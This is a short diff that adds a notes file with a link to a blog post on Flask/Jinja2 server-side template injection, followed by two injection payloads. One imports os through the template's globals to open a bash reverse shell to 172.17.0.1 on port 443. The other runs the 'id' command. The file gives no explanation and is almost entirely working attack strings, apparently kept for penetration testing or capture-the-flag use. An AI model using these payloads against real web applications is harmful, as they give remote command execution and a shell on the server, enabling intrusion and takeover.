@@ -1,0 +1,6 @@
+https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"').read()}}
+
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
